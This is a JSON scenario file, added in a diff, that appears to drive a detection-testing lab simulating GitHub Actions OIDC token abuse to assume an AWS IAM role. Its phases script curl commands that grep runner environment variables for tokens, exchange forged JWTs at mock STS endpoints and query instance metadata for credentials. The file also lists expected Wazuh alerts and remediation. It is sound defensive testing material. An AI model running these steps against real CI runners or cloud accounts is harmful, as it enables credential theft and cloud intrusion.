@@ -1,0 +1,150 @@
+{
+  "id": "S8-01",
+  "name": "GitHub Actions OIDC Federation to AWS/GCP",
+  "category": "OAuth/OIDC",
+  "version": "1.0",
+  "description": "Attacker abuses GitHub Actions OIDC token to assume AWS IAM role via STS AssumeRoleWithWebIdentity, pivoting from CI/CD to cloud infrastructure without static credentials",
+  "difficulty": "Hard",
+  "real_world_relevance": "CircleCI breach (2023), GitHub Actions OIDC misconfiguration allowing arbitrary repositories to assume production AWS roles, Codecov supply chain attack leveraging CI tokens",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Defense Evasion", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"},
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-sts-federation"],
+    "network": "cicd_net",
+    "profile": "oauth-oidc"
+  },
+
+  "attack_flow": {
+    "description": "Attacker extracts GitHub Actions OIDC token from CI/CD runner environment and exchanges it for cloud provider credentials via STS federation",
+    "diagram": [
+      "1. Attacker compromises CI/CD runner or injects malicious workflow step",
+      "2. Extract ACTIONS_ID_TOKEN_REQUEST_TOKEN and ACTIONS_ID_TOKEN_REQUEST_URL",
+      "3. Request OIDC token from GitHub's token endpoint",
+      "4. Exchange OIDC token for AWS credentials via STS AssumeRoleWithWebIdentity",
+      "5. Use cloud credentials to enumerate and access production resources"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "CI/CD Environment Reconnaissance",
+      "description": "Discover OIDC-related environment variables in the runner",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -iE 'ACTIONS_ID_TOKEN|OIDC|JWT|GITHUB_TOKEN' || echo 'No OIDC vars found'",
+          "description": "Enumerate GitHub Actions OIDC environment variables"
+        }
+      ]
+    },
+    {
+      "name": "OIDC Token Extraction",
+      "description": "Request OIDC token from GitHub Actions token endpoint",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s http://mock-sts-federation:8091/v1/identity/oidc/.well-known/openid-configuration 2>/dev/null | python3 -m json.tool || echo 'OIDC discovery failed'",
+          "description": "Fetch OIDC discovery document"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/v1/token -H 'Content-Type: application/json' -d '{\"grant_type\":\"urn:ietf:params:oauth:grant-type:jwt-bearer\",\"assertion\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyZXBvOmF0dGFja2VyL21hbGljaW91cy1yZXBvOnJlZjpyZWZzL2hlYWRzL21haW4iLCJhdWQiOiJzdHMuYW1hem9uYXdzLmNvbSIsImlzcyI6Imh0dHBzOi8vdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb20iLCJleHAiOjk5OTk5OTk5OTl9.fake-signature\",\"audience\":\"sts.amazonaws.com\"}' 2>/dev/null | python3 -m json.tool || echo 'Token exchange failed'",
+          "description": "Exchange GitHub Actions OIDC JWT for federation token"
+        }
+      ]
+    },
+    {
+      "name": "Cloud Credential Acquisition",
+      "description": "Use federated token to assume AWS IAM role via STS",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-sts-federation:8091/sts/AssumeRoleWithWebIdentity -H 'Content-Type: application/x-www-form-urlencoded' -d 'RoleArn=arn:aws:iam::123456789012:role/GitHubActionsRole&RoleSessionName=attacker-session&WebIdentityToken=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvOmF0dGFja2VyL21hbGljaW91cy1yZXBvOnJlZjpyZWZzL2hlYWRzL21haW4ifQ.fake' 2>/dev/null | python3 -m json.tool || echo 'STS assume role failed'",
+          "description": "Assume AWS IAM role using OIDC token via STS AssumeRoleWithWebIdentity"
+        }
+      ]
+    },
+    {
+      "name": "Cloud Resource Enumeration",
+      "description": "Use obtained cloud credentials to access resources",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s http://mock-imds:1338/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo 'IMDS not reachable'",
+          "description": "Enumerate accessible cloud resources with stolen credentials"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "STS Federation Logs",
+      "description": "OIDC token exchange via STS federation endpoint",
+      "wazuh_rule": "100970"
+    },
+    {
+      "type": "STS Federation Logs",
+      "description": "GitHub Actions OIDC federation to cloud provider",
+      "wazuh_rule": "100971"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100970",
+      "level": 12,
+      "description": "NHI: OIDC token exchange via STS federation endpoint"
+    },
+    {
+      "rule_id": "100971",
+      "level": 14,
+      "description": "NHI: GitHub Actions OIDC federation to cloud provider - CI/CD to cloud pivot"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke any cloud credentials obtained via compromised OIDC tokens",
+      "Audit AWS IAM role trust policies for overly permissive OIDC conditions",
+      "Review GitHub Actions workflow logs for unauthorized token requests"
+    ],
+    "long_term": [
+      "Restrict IAM role trust policies to specific repositories and branches using sub claim conditions",
+      "Implement audience restrictions on OIDC federation trust policies",
+      "Enable CloudTrail logging for all AssumeRoleWithWebIdentity calls",
+      "Use GitHub environment protection rules to limit OIDC token issuance"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub Actions OIDC Federation Security",
+      "url": "https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect"
+    },
+    {
+      "title": "AWS STS AssumeRoleWithWebIdentity",
+      "url": "https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html"
+    },
+    {
+      "title": "MITRE ATT&CK T1078.004 - Cloud Accounts",
+      "url": "https://attack.mitre.org/techniques/T1078/004/"
+    }
+  ]
+}
